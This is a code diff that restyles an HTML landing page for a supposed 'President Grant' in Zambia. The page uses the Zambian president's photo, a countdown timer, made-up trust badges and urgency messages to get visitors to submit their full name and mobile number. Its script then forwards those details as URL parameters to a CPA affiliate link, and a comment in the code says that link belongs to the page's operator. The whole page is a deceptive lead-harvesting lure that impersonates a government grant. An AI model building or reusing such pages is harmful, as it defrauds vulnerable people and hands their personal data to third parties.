@@ -1,269 +1,447 @@
 <!doctype html>
 <html lang="en" dir="ltr">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>President Grant Zambia | Registration</title>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>President Grant | Zambia Registration</title>
 
+  <!-- Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap" rel="stylesheet">
 
   <style>
     :root{
-      --bg:#070c16;
-      --card:#0e1630;
-      --muted:#9fb0d0;
-      --text:#eaf0ff;
-      --accent:#25d366;
-      --accent2:#2b7fff;
-      --border: rgba(255,255,255,.12);
-      --shadow: 0 22px 80px rgba(0,0,0,.45);
+      --bg0:#050814;
+      --bg1:#070c1b;
+      --card: rgba(255,255,255,.06);
+      --card2: rgba(255,255,255,.09);
+      --stroke: rgba(255,255,255,.12);
+      --stroke2: rgba(255,255,255,.18);
+      --text:#eef3ff;
+      --muted: rgba(238,243,255,.72);
+
+      --a1:#7c3aed; /* violet */
+      --a2:#06b6d4; /* cyan */
+      --a3:#22c55e; /* green */
+      --a4:#f59e0b; /* amber */
+      --danger:#ff4d4d;
+
+      --shadow: 0 30px 90px rgba(0,0,0,.55);
+      --radius: 22px;
     }
 
-    *{box-sizing:border-box}
+    *{ box-sizing:border-box }
+    html, body { height: 100%; }
     body{
       margin:0;
-      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial;
+      font-family: "Manrope", system-ui, -apple-system, Segoe UI, Roboto, Arial;
+      color: var(--text);
       background:
-        radial-gradient(1000px 520px at 70% 10%, rgba(43,127,255,.22), transparent 60%),
-        radial-gradient(900px 420px at 25% 30%, rgba(37,211,102,.18), transparent 55%),
-        var(--bg);
-      color:var(--text);
-      line-height:1.6;
+        radial-gradient(900px 480px at 70% 10%, rgba(124,58,237,.25), transparent 60%),
+        radial-gradient(800px 420px at 15% 35%, rgba(6,182,212,.22), transparent 55%),
+        radial-gradient(700px 420px at 90% 60%, rgba(34,197,94,.16), transparent 60%),
+        linear-gradient(180deg, var(--bg0), var(--bg1));
+      overflow-x:hidden;
     }
-    a{color:inherit}
 
-    .wrap{max-width:1120px;margin:0 auto;padding:18px}
+    a{ color: inherit; text-decoration:none; }
+    .wrap{ max-width: 1180px; margin: 0 auto; padding: 18px; }
 
+    /* Subtle animated background dots */
+    .bg-dots{
+      position: fixed;
+      inset: 0;
+      pointer-events:none;
+      opacity:.35;
+      background-image: radial-gradient(rgba(255,255,255,.10) 1px, transparent 1px);
+      background-size: 26px 26px;
+      mask-image: radial-gradient(60% 50% at 50% 20%, black, transparent 75%);
+      animation: drift 14s linear infinite;
+    }
+    @keyframes drift{
+      0%{ transform: translateY(0); }
+      100%{ transform: translateY(26px); }
+    }
+
+    /* Top bar */
     .topbar{
-      display:flex; align-items:center; justify-content:space-between; gap:12px;
-      padding:10px 0;
+      display:flex; align-items:center; justify-content:space-between;
+      gap:12px; padding: 10px 0 6px;
     }
     .brand{
       display:flex; align-items:center; gap:10px;
       font-weight:800; letter-spacing:.2px;
     }
-    .brand .logo{
-      width:34px;height:34px;border-radius:12px;
+    .logo{
+      width:40px;height:40px;border-radius:14px;
       display:grid;place-items:center;
-      background: rgba(43,127,255,.18);
-      border:1px solid var(--border);
+      background: linear-gradient(135deg, rgba(124,58,237,.25), rgba(6,182,212,.18));
+      border:1px solid var(--stroke);
+      box-shadow: 0 10px 40px rgba(124,58,237,.18);
     }
-    .badge{
-      font-size:12px;
-      color:rgba(234,240,255,.82);
-      padding:6px 10px;
-      border:1px solid var(--border);
-      border-radius:999px;
-      background: rgba(255,255,255,.04);
-      white-space:nowrap;
+    .brand small{ display:block; color: var(--muted); font-weight:700; margin-top:1px; }
+    .pill{
+      display:flex; align-items:center; gap:8px;
+      padding: 8px 12px;
+      border-radius: 999px;
+      border: 1px solid var(--stroke);
+      background: rgba(255,255,255,.05);
+      backdrop-filter: blur(10px);
+      font-size: 12px;
+      color: rgba(238,243,255,.78);
+      white-space: nowrap;
+    }
+    .dot{
+      width:8px;height:8px;border-radius:50%;
+      background: var(--a3);
+      box-shadow: 0 0 0 6px rgba(34,197,94,.18);
     }
 
+    /* Hero layout */
     .hero{
       display:grid;
-      grid-template-columns: 1.3fr .9fr;
-      gap:18px;
-      align-items:stretch;
-      margin-top:10px;
+      grid-template-columns: 1.05fr .95fr;
+      gap: 18px;
+      margin-top: 10px;
+      align-items: stretch;
     }
 
     .panel{
-      background: linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));
-      border:1px solid var(--border);
-      border-radius:18px;
+      border: 1px solid var(--stroke);
+      background: linear-gradient(180deg, rgba(255,255,255,.07), rgba(255,255,255,.04));
+      border-radius: var(--radius);
       overflow:hidden;
       box-shadow: var(--shadow);
+      position: relative;
     }
 
-    .banner{
-      position:relative;
-      min-height:360px;
-      padding:18px;
+    /* HERO IMAGE: President appears FIRST visually */
+    .heroImage{
+      min-height: 430px;
       display:flex;
-      flex-direction:column;
-      justify-content:flex-end;
-      gap:12px;
+      flex-direction: column;
+      justify-content: flex-end;
+      padding: 18px;
       background:
-        linear-gradient(90deg, rgba(7,12,22,.90), rgba(7,12,22,.40)),
-        url("https://upload.wikimedia.org/wikipedia/commons/thumb/6/6a/President_of_Zambia_Hakainde_Hichilema_at_the_US_SFRC.jpg/1280px-President_of_Zambia_Hakainde_Hichilema_at_the_US_SFRC.jpg");
-      background-size:cover;
-      background-position:center 20%;
+        linear-gradient(180deg, rgba(0,0,0,.06) 10%, rgba(0,0,0,.78) 78%),
+        radial-gradient(700px 340px at 70% 10%, rgba(124,58,237,.35), transparent 60%),
+        url("https://upload.wikimedia.org/wikipedia/commons/thumb/6/6a/President_of_Zambia_Hakainde_Hichilema_at_the_US_SFRC.jpg/1600px-President_of_Zambia_Hakainde_Hichilema_at_the_US_SFRC.jpg");
+      background-size: cover;
+      background-position: center 18%;
     }
 
-    .title{
-      margin:0;
-      font-size:36px;
-      line-height:1.15;
-      font-weight:800;
-      max-width: 26ch;
+    .heroBadgeRow{
+      display:flex; flex-wrap:wrap; gap:10px;
+      margin-bottom: 10px;
     }
-    .subtitle{
-      margin:0;
-      color:rgba(234,240,255,.75);
-      font-weight:600;
-      max-width: 70ch;
+    .heroBadge{
+      display:inline-flex; align-items:center; gap:8px;
+      padding: 8px 12px;
+      border-radius: 999px;
+      border: 1px solid var(--stroke);
+      background: rgba(0,0,0,.28);
+      backdrop-filter: blur(10px);
+      font-size: 12px;
+      color: rgba(238,243,255,.85);
+    }
+    .spark{
+      width: 18px; height: 18px; border-radius: 6px;
+      background: linear-gradient(135deg, rgba(245,158,11,.9), rgba(34,197,94,.8));
+      box-shadow: 0 12px 30px rgba(245,158,11,.18);
     }
 
+    .headline{
+      margin:0;
+      font-size: 40px;
+      line-height: 1.1;
+      font-weight: 800;
+      max-width: 22ch;
+      text-shadow: 0 18px 60px rgba(0,0,0,.6);
+    }
+    .subhead{
+      margin: 10px 0 0;
+      color: rgba(238,243,255,.80);
+      font-weight: 600;
+      max-width: 75ch;
+    }
+
+    /* Countdown */
     .countdown{
       display:flex; gap:10px; flex-wrap:wrap;
-      align-items:center;
+      margin-top: 14px;
     }
     .timebox{
-      background: rgba(0,0,0,.38);
-      border:1px solid var(--border);
-      border-radius:14px;
-      padding:10px 12px;
-      min-width:92px;
+      flex: 0 0 auto;
+      min-width: 96px;
+      padding: 10px 12px;
+      border-radius: 16px;
+      border: 1px solid var(--stroke);
+      background: rgba(0,0,0,.28);
+      backdrop-filter: blur(12px);
       text-align:center;
-      backdrop-filter: blur(8px);
     }
-    .timebox .num{font-size:26px;font-weight:800; line-height:1}
-    .timebox .lbl{font-size:12px;color:rgba(234,240,255,.7); margin-top:3px}
+    .num{ font-size: 26px; font-weight: 800; line-height: 1; }
+    .lbl{ font-size: 12px; color: rgba(238,243,255,.75); margin-top: 4px; }
 
-    .note{
-      font-size:12px;
-      color:rgba(234,240,255,.6);
-    }
-
-    .form{
-      padding:18px;
+    /* Form */
+    .formWrap{
+      padding: 18px;
       display:flex;
-      flex-direction:column;
-      gap:12px;
+      flex-direction: column;
+      gap: 12px;
     }
-    .form h2{
+    .formTitle{
+      display:flex; align-items:flex-start; justify-content:space-between; gap:12px;
+    }
+    .formTitle h2{
       margin:0;
-      font-size:22px;
-      font-weight:800;
+      font-size: 22px;
+      font-weight: 800;
     }
-    .form p{margin:0;color:rgba(234,240,255,.72)}
+    .formTitle p{
+      margin: 6px 0 0;
+      color: var(--muted);
+      font-weight: 600;
+    }
 
-    .field{display:flex; flex-direction:column; gap:6px}
-    label{font-weight:700; font-size:14px}
+    .glass{
+      border: 1px solid var(--stroke);
+      background: rgba(255,255,255,.05);
+      border-radius: 18px;
+      padding: 12px;
+    }
+
+    .field{ display:flex; flex-direction:column; gap: 7px; }
+    label{ font-weight: 800; font-size: 13px; letter-spacing:.2px; }
     input{
-      padding:12px 12px;
-      border-radius:12px;
-      border:1px solid var(--border);
+      padding: 13px 12px;
+      border-radius: 14px;
+      border: 1px solid var(--stroke);
       background: rgba(255,255,255,.04);
-      color:var(--text);
+      color: var(--text);
       outline:none;
-      font-size:15px;
+      font-size: 15px;
     }
-    input::placeholder{color:rgba(234,240,255,.45)}
+    input::placeholder{ color: rgba(238,243,255,.45); }
     input:focus{
-      border-color: rgba(43,127,255,.60);
-      box-shadow: 0 0 0 3px rgba(43,127,255,.18)
+      border-color: rgba(6,182,212,.55);
+      box-shadow: 0 0 0 4px rgba(6,182,212,.16);
     }
 
-    .row{
-      display:grid;
-      grid-template-columns: 1fr 1fr;
-      gap:10px;
+    .grid2{ display:grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+    .cta{
+      display:flex; gap:10px; flex-wrap:wrap; align-items:center;
+      margin-top: 4px;
     }
 
     .btn{
-      border:none;
-      border-radius:14px;
-      padding:12px 14px;
-      font-weight:800;
-      font-size:16px;
+      width:100%;
+      border: none;
+      border-radius: 16px;
+      padding: 13px 14px;
+      font-weight: 900;
+      font-size: 16px;
       cursor:pointer;
-      background: linear-gradient(90deg, var(--accent), #34e17a);
-      color:#06210f;
+      color: #071016;
+      background: linear-gradient(90deg, rgba(34,197,94,1), rgba(6,182,212,1));
+      box-shadow: 0 18px 60px rgba(6,182,212,.22);
+      transition: transform .08s ease, filter .2s ease;
     }
-    .btn:active{transform: translateY(1px)}
+    .btn:hover{ filter: brightness(1.05); }
+    .btn:active{ transform: translateY(1px); }
 
-    .fineprint{
-      font-size:12px;
-      color:rgba(234,240,255,.6);
+    .trustRow{
+      display:flex; gap:10px; flex-wrap:wrap;
+      margin-top: 10px;
     }
+    .trust{
+      flex: 1 1 140px;
+      padding: 10px 12px;
+      border-radius: 16px;
+      border:1px solid var(--stroke);
+      background: rgba(255,255,255,.04);
+    }
+    .trust b{ display:block; font-size: 13px; }
+    .trust span{ display:block; margin-top:2px; font-size: 12px; color: var(--muted); }
 
     .status{
       display:none;
-      padding:10px 12px;
-      border-radius:12px;
-      border:1px solid var(--border);
-      background: rgba(255,255,255,.04);
-      color: var(--text);
+      padding: 10px 12px;
+      border-radius: 16px;
+      border:1px solid var(--stroke);
+      background: rgba(255,255,255,.05);
+      font-weight: 700;
     }
-    .status.ok{border-color: rgba(37,211,102,.35)}
-    .status.err{border-color: rgba(255,77,77,.35); color:#ffd1d1}
+    .status.ok{ border-color: rgba(34,197,94,.35); }
+    .status.err{ border-color: rgba(255,77,77,.40); color: #ffd1d1; }
 
-    .section{margin-top:18px;padding:18px}
-    .section h3{margin:0 0 10px 0; font-size:20px; font-weight:800}
-    .section p{margin:0 0 14px 0;color:rgba(234,240,255,.70)}
+    .fineprint{
+      font-size: 12px;
+      color: rgba(238,243,255,.60);
+      line-height: 1.5;
+    }
 
-    .grid{
+    /* Gallery */
+    .section{
+      margin-top: 18px;
+      padding: 18px;
+    }
+    .sectionHead{
+      display:flex; align-items:flex-end; justify-content:space-between; gap:12px;
+      margin-bottom: 12px;
+    }
+    .section h3{ margin:0; font-size: 22px; font-weight: 900; }
+    .section p{ margin: 6px 0 0; color: var(--muted); font-weight: 600; }
+
+    .gallery{
       display:grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap:10px;
+      grid-template-columns: repeat(12, 1fr);
+      gap: 10px;
     }
-    .card{
-      border:1px solid var(--border);
-      border-radius:16px;
+
+    .gcard{
+      grid-column: span 3;
+      border-radius: 18px;
       overflow:hidden;
+      border: 1px solid var(--stroke);
       background: rgba(255,255,255,.03);
+      position: relative;
+      min-height: 140px;
+      transform: translateY(0);
+      transition: transform .22s ease, border-color .22s ease;
     }
-    .card img{
+    .gcard:hover{
+      transform: translateY(-3px);
+      border-color: rgba(255,255,255,.22);
+    }
+    .gcard img{
       width:100%;
-      height:120px;
-      object-fit:cover;
+      height: 150px;
+      object-fit: cover;
       display:block;
+      filter: saturate(1.05) contrast(1.03);
     }
-    .card .meta{padding:10px}
+    .gmeta{
+      padding: 10px 12px 12px;
+      display:flex; align-items:center; justify-content:space-between; gap:10px;
+    }
     .tag{
-      display:inline-block;
-      font-size:12px;
-      padding:4px 10px;
-      border-radius:999px;
-      border:1px solid var(--border);
-      color:rgba(234,240,255,.78);
+      display:inline-flex; align-items:center; gap:8px;
+      font-size: 12px;
+      padding: 6px 10px;
+      border-radius: 999px;
+      border: 1px solid var(--stroke);
       background: rgba(255,255,255,.03);
+      color: rgba(238,243,255,.80);
+    }
+    .miniDot{
+      width:8px;height:8px;border-radius:50%;
+      background: linear-gradient(135deg, var(--a2), var(--a1));
+      box-shadow: 0 0 0 6px rgba(124,58,237,.12);
     }
 
+    /* Footer */
     footer{
-      padding:24px 18px;
-      color:rgba(234,240,255,.55);
-      font-size:12px;
+      padding: 26px 18px 90px;
       text-align:center;
+      color: rgba(238,243,255,.55);
+      font-size: 12px;
     }
 
-    @media (max-width: 980px){
-      .hero{grid-template-columns:1fr}
-      .grid{grid-template-columns: repeat(2, 1fr);}
+    /* Mobile sticky CTA */
+    .stickyCTA{
+      position: fixed;
+      left: 0; right: 0; bottom: 0;
+      padding: 12px;
+      background: linear-gradient(180deg, transparent, rgba(5,8,20,.82) 30%, rgba(5,8,20,.92));
+      backdrop-filter: blur(10px);
+      border-top: 1px solid rgba(255,255,255,.10);
+      display:none;
+      z-index: 50;
     }
-    @media (max-width: 520px){
-      .row{grid-template-columns:1fr}
-      .grid{grid-template-columns:1fr}
-      .title{font-size:28px}
-      .timebox{min-width:82px}
+    .stickyInner{
+      max-width: 1180px;
+      margin: 0 auto;
+      display:flex;
+      gap: 10px;
+      align-items:center;
+      justify-content:space-between;
+      padding: 0 6px;
+    }
+    .stickyText b{ display:block; font-size: 13px; }
+    .stickyText span{ display:block; font-size: 12px; color: rgba(238,243,255,.68); }
+    .stickyBtn{
+      border:none;
+      border-radius: 16px;
+      padding: 12px 14px;
+      font-weight: 900;
+      cursor:pointer;
+      color:#071016;
+      background: linear-gradient(90deg, rgba(245,158,11,1), rgba(34,197,94,1));
+      box-shadow: 0 18px 60px rgba(245,158,11,.18);
+      white-space:nowrap;
+    }
+
+    /* Responsive */
+    @media (max-width: 1020px){
+      .hero{ grid-template-columns: 1fr; }
+      .headline{ font-size: 34px; }
+      .gcard{ grid-column: span 6; }
+      .stickyCTA{ display:block; }
+    }
+    @media (max-width: 560px){
+      .grid2{ grid-template-columns: 1fr; }
+      .headline{ font-size: 30px; }
+      .timebox{ min-width: 88px; }
+      .gcard{ grid-column: span 12; }
+    }
+
+    /* Simple entrance animation */
+    .reveal{ opacity:0; transform: translateY(10px); animation: in .7s ease forwards; }
+    .reveal.delay1{ animation-delay: .08s; }
+    .reveal.delay2{ animation-delay: .16s; }
+    .reveal.delay3{ animation-delay: .24s; }
+    @keyframes in{
+      to{ opacity:1; transform: translateY(0); }
     }
   </style>
 </head>
 
 <body>
+  <div class="bg-dots"></div>
+
   <div class="wrap">
-    <div class="topbar">
+    <!-- Top Bar -->
+    <div class="topbar reveal">
       <div class="brand">
         <div class="logo">🎓</div>
         <div>
-          <div style="font-size:14px; opacity:.9;">Zambia</div>
           <div style="font-size:16px;">President Grant</div>
+          <small>Zambia Registration Portal</small>
         </div>
       </div>
-      <div class="badge" id="urgencyText">Limited-time registration</div>
+      <div class="pill" id="urgencyText">
+        <span class="dot"></span>
+        Limited-time registration
+      </div>
     </div>
 
+    <!-- HERO -->
     <div class="hero">
-      <!-- Banner -->
-      <div class="panel banner">
-        <div>
-          <h1 class="title">Register Now for the President Grant</h1>
-          <p class="subtitle">
-            Fill in your details below to proceed. Registration is available for a limited time only.
-          </p>
+      <!-- President image FIRST -->
+      <div class="panel heroImage reveal delay1" aria-label="President image and headline">
+        <div class="heroBadgeRow">
+          <div class="heroBadge"><span class="spark"></span> Fast registration (under 30 sec)</div>
+          <div class="heroBadge">Secure & private</div>
+          <div class="heroBadge">Nationwide eligibility</div>
         </div>
+
+        <h1 class="headline">Apply now for the President Grant (Zambia)</h1>
+        <p class="subhead">
+          Complete the form to continue. A limited number of registrations are accepted during this period.
+        </p>
 
         <div class="countdown" aria-label="countdown timer">
           <div class="timebox"><div class="num" id="d">00</div><div class="lbl">Days</div></div>
@@ -272,103 +450,137 @@
           <div class="timebox"><div class="num" id="s">00</div><div class="lbl">Seconds</div></div>
         </div>
 
-        <div class="note">
-          Banner image is from Wikimedia Commons (use proper attribution if required).
+        <div style="margin-top:10px" class="fineprint">
+          Disclaimer: This page is not an official government website. It is a promotional registration page.
         </div>
       </div>
 
-      <!-- Form -->
-      <div class="panel">
-        <form class="form" id="leadForm">
-          <h2>Registration Form</h2>
-          <p>Please enter your full name and mobile number.</p>
-
-          <div class="field">
-            <label for="name">Full Name</label>
-            <input id="name" name="name" type="text" placeholder="e.g., John Mwansa" required minlength="3" />
+      <!-- Form panel -->
+      <div class="panel reveal delay2">
+        <div class="formWrap">
+          <div class="formTitle">
+            <div>
+              <h2>Registration Form</h2>
+              <p>Enter your details to proceed to the next step.</p>
+            </div>
+            <div class="pill" style="gap:6px;">
+              <span style="width:8px;height:8px;border-radius:50%;background:linear-gradient(135deg,var(--a4),var(--a2));box-shadow:0 0 0 6px rgba(6,182,212,.12)"></span>
+              Verified step
+            </div>
           </div>
 
-          <div class="field">
-            <label for="phone">Mobile Number</label>
-            <input id="phone" name="phone" type="tel" placeholder="+260XXXXXXXXX" required />
-            <div class="fineprint">Tip: Zambia country code is +260</div>
+          <form id="leadForm" class="glass">
+            <div class="grid2">
+              <div class="field">
+                <label for="name">Full Name</label>
+                <input id="name" name="name" type="text" placeholder="e.g., John Mwansa" required minlength="3"/>
+              </div>
+              <div class="field">
+                <label for="phone">Mobile Number</label>
+                <input id="phone" name="phone" type="tel" placeholder="+260XXXXXXXXX" required/>
+              </div>
+            </div>
+
+            <div style="height:10px"></div>
+
+            <button class="btn" type="submit">Continue to Next Step</button>
+
+            <div class="status ok" id="okMsg" style="margin-top:10px;">Success! Redirecting…</div>
+            <div class="status err" id="errMsg" style="margin-top:10px;">Please check your details and try again.</div>
+
+            <div style="margin-top:10px" class="fineprint">
+              By continuing, you agree to be contacted via phone/WhatsApp regarding the registration process.
+              <br/>Tip: Zambia country code is <b>+260</b>.
+            </div>
+          </form>
+
+          <div class="trustRow">
+            <div class="trust">
+              <b>Instant access</b>
+              <span>Go to the next step immediately after submitting.</span>
+            </div>
+            <div class="trust">
+              <b>Mobile-friendly</b>
+              <span>Optimized for all phones and browsers.</span>
+            </div>
+            <div class="trust">
+              <b>Clear process</b>
+              <span>Simple form, fast completion.</span>
+            </div>
           </div>
-
-          <button class="btn" type="submit">✅ Continue</button>
-
-          <div class="status ok" id="okMsg">Success! Redirecting you now…</div>
-          <div class="status err" id="errMsg">Please check your details and try again.</div>
 
           <div class="fineprint">
-            By continuing, you agree to be contacted by phone/WhatsApp regarding the grant registration.
+            Image used in header is from Wikimedia Commons (attribution may be required depending on your use).
           </div>
-        </form>
+        </div>
       </div>
     </div>
 
     <!-- Gallery -->
-    <div class="panel section">
-      <h3>Grant Highlights & Opportunities</h3>
-      <p>Examples of available opportunities inside the program (images are illustrative).</p>
+    <div class="panel section reveal delay3">
+      <div class="sectionHead">
+        <div>
+          <h3>Program Opportunities</h3>
+          <p>Illustrative images of scholarships, training, and education support.</p>
+        </div>
+        <div class="pill">Updated: <span id="today"></span></div>
+      </div>
 
-      <div class="grid">
-        <div class="card">
-          <img alt="Scholarship" src="https://images.unsplash.com/photo-1523580846011-d3a5bc25702b?auto=format&fit=crop&w=1200&q=80">
-          <div class="meta"><span class="tag">Tuition Support</span></div>
-        </div>
-        <div class="card">
-          <img alt="Education" src="https://images.unsplash.com/photo-1523050854058-8df90110c9f1?auto=format&fit=crop&w=1200&q=80">
-          <div class="meta"><span class="tag">Training Programs</span></div>
-        </div>
-        <div class="card">
-          <img alt="Students" src="https://images.unsplash.com/photo-1523240795612-9a054b0db644?auto=format&fit=crop&w=1200&q=80">
-          <div class="meta"><span class="tag">Multiple Fields</span></div>
-        </div>
-        <div class="card">
-          <img alt="Support" src="https://images.unsplash.com/photo-1529070538774-1843cb3265df?auto=format&fit=crop&w=1200&q=80">
-          <div class="meta"><span class="tag">Merit-Based</span></div>
-        </div>
+      <div class="gallery">
+        <!-- 12 images (replace with your own if you want) -->
+        <div class="gcard"><img alt="Scholarship" src="https://images.unsplash.com/photo-1523580846011-d3a5bc25702b?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Tuition Support</span><span class="tag">Top picks</span></div></div>
+        <div class="gcard"><img alt="Education" src="https://images.unsplash.com/photo-1523050854058-8df90110c9f1?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Study Programs</span><span class="tag">2026</span></div></div>
+        <div class="gcard"><img alt="Students" src="https://images.unsplash.com/photo-1523240795612-9a054b0db644?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Multiple Fields</span><span class="tag">Fast</span></div></div>
+        <div class="gcard"><img alt="Support" src="https://images.unsplash.com/photo-1529070538774-1843cb3265df?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Merit-Based</span><span class="tag">Limited</span></div></div>
 
-        <div class="card">
-          <img alt="Library" src="https://images.unsplash.com/photo-1524995997946-a1c2e315a42f?auto=format&fit=crop&w=1200&q=80">
-          <div class="meta"><span class="tag">Research Support</span></div>
-        </div>
-        <div class="card">
-          <img alt="Graduation" src="https://images.unsplash.com/photo-1523580494863-6f3031224c94?auto=format&fit=crop&w=1200&q=80">
-          <div class="meta"><span class="tag">Certificates</span></div>
-        </div>
-        <div class="card">
-          <img alt="Learning" src="https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=1200&q=80">
-          <div class="meta"><span class="tag">Online Options</span></div>
-        </div>
-        <div class="card">
-          <img alt="International" src="https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&w=1200&q=80">
-          <div class="meta"><span class="tag">International Exposure</span></div>
-        </div>
+        <div class="gcard"><img alt="Library" src="https://images.unsplash.com/photo-1524995997946-a1c2e315a42f?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Research</span><span class="tag">Support</span></div></div>
+        <div class="gcard"><img alt="Graduation" src="https://images.unsplash.com/photo-1523580494863-6f3031224c94?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Certificates</span><span class="tag">Career</span></div></div>
+        <div class="gcard"><img alt="Learning" src="https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Training</span><span class="tag">Skills</span></div></div>
+        <div class="gcard"><img alt="International" src="https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Exposure</span><span class="tag">Global</span></div></div>
+
+        <div class="gcard"><img alt="Campus" src="https://images.unsplash.com/photo-1541339907198-e08756dedf3f?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Campus Life</span><span class="tag">Community</span></div></div>
+        <div class="gcard"><img alt="Books" src="https://images.unsplash.com/photo-1519681393784-d120267933ba?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Resources</span><span class="tag">Access</span></div></div>
+        <div class="gcard"><img alt="Laptop" src="https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Online Options</span><span class="tag">Flexible</span></div></div>
+        <div class="gcard"><img alt="Team" src="https://images.unsplash.com/photo-1521737604893-d14cc237f11d?auto=format&fit=crop&w=1400&q=80"><div class="gmeta"><span class="tag"><span class="miniDot"></span> Mentorship</span><span class="tag">Guidance</span></div></div>
       </div>
     </div>
 
     <footer>
-      © <span id="year"></span> President Grant — Landing Page (Demo).<br/>
-      Add your Privacy Policy + official contact to increase trust and improve ad approval.
+      © <span id="year"></span> President Grant — Promotional Registration Page.
+      <br/>Not affiliated with a government entity. Add Privacy Policy / Contact for higher trust & ad approval.
     </footer>
   </div>
 
-  <script>
-    // ========= SETTINGS =========
+  <!-- Mobile sticky CTA -->
+  <div class="stickyCTA">
+    <div class="stickyInner">
+      <div class="stickyText">
+        <b>President Grant Registration</b>
+        <span>Submit your details to continue</span>
+      </div>
+      <button class="stickyBtn" type="button" onclick="document.getElementById('leadForm').scrollIntoView({behavior:'smooth',block:'center'})">
+        Register Now
+      </button>
+    </div>
+  </div>
 
-    // Countdown end time (Lusaka is typically UTC+2).
-    // Change this date/time anytime you want.
+  <script>
+    // ====== SETTINGS ======
+    // Change the countdown end time here (Lusaka typically UTC+2).
     const END_AT = "2026-03-01T23:59:00+02:00";
 
-    // Your CPA link (redirect target)
+    // Your CPA link (redirect after form submit)
     const CPA_URL = "https://iconics.adsleads1.store/?utm_medium=45cb5b04ee2dd3d524876ef99d99f52ba4436745&utm_campaign=menhaza";
 
-    // OPTIONAL: append captured fields to CPA URL as query params
-    // (Some networks accept custom params; if not needed set to false)
+    // Append captured fields to CPA URL (only if your network accepts these params)
     const APPEND_PARAMS_TO_CPA = true;
 
-    // ========= COUNTDOWN =========
+    // ====== DATE UI ======
+    const today = new Date();
+    document.getElementById("today").textContent = today.toLocaleDateString(undefined, {year:"numeric", month:"short", day:"2-digit"});
+    document.getElementById("year").textContent = today.getFullYear();
+
+    // ====== COUNTDOWN ======
     const el = (id) => document.getElementById(id);
     const pad = (n) => String(n).padStart(2, "0");
 
@@ -391,18 +603,13 @@
       el("s").textContent = pad(s);
 
       if (end - now <= 0) {
-        el("urgencyText").textContent = "Registration closed";
+        el("urgencyText").innerHTML = '<span class="dot" style="background:var(--danger); box-shadow:0 0 0 6px rgba(255,77,77,.14)"></span> Registration closed';
       }
     }
     tick();
     setInterval(tick, 1000);
-    el("year").textContent = new Date().getFullYear();
 
-    // ========= FORM SUBMIT =========
-    const form = document.getElementById("leadForm");
-    const okMsg = document.getElementById("okMsg");
-    const errMsg = document.getElementById("errMsg");
-
+    // ====== REDIRECT HELPERS ======
     function buildRedirectUrl(baseUrl, paramsObj){
       try{
         const u = new URL(baseUrl);
@@ -413,7 +620,6 @@
         });
         return u.toString();
       }catch(e){
-        // fallback if URL parsing fails
         const qs = Object.entries(paramsObj)
           .filter(([,v]) => v !== undefined && v !== null && String(v).trim() !== "")
           .map(([k,v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v).trim())}`)
@@ -421,6 +627,11 @@
         return baseUrl + (baseUrl.includes("?") ? "&" : "?") + qs;
       }
     }
+
+    // ====== FORM SUBMIT ======
+    const form = document.getElementById("leadForm");
+    const okMsg = document.getElementById("okMsg");
+    const errMsg = document.getElementById("errMsg");
 
     form.addEventListener("submit", (e) => {
       e.preventDefault();
@@ -430,14 +641,11 @@
       const name = document.getElementById("name").value.trim();
       const phone = document.getElementById("phone").value.trim();
 
-      // Basic validation
       if (name.length < 3) {
         errMsg.textContent = "Please enter your full name.";
         errMsg.style.display = "block";
         return;
       }
-
-      // Accept numbers, spaces, +, -, parentheses
       const phoneOk = /^[0-9+\-\s()]{8,}$/.test(phone);
       if (!phoneOk) {
         errMsg.textContent = "Please enter a valid mobile number.";
@@ -447,11 +655,8 @@
 
       okMsg.style.display = "block";
 
-      // Build redirect URL
       let goTo = CPA_URL;
-
       if (APPEND_PARAMS_TO_CPA) {
-        // Rename keys if your CPA network expects specific parameter names
         goTo = buildRedirectUrl(CPA_URL, {
           full_name: name,
           mobile: phone,
@@ -459,12 +664,8 @@
         });
       }
 
-      // redirect after a short moment (better UX)
-      setTimeout(() => {
-        window.location.href = goTo;
-      }, 900);
+      setTimeout(() => { window.location.href = goTo; }, 850);
     });
   </script>
 </body>
 </html>
-
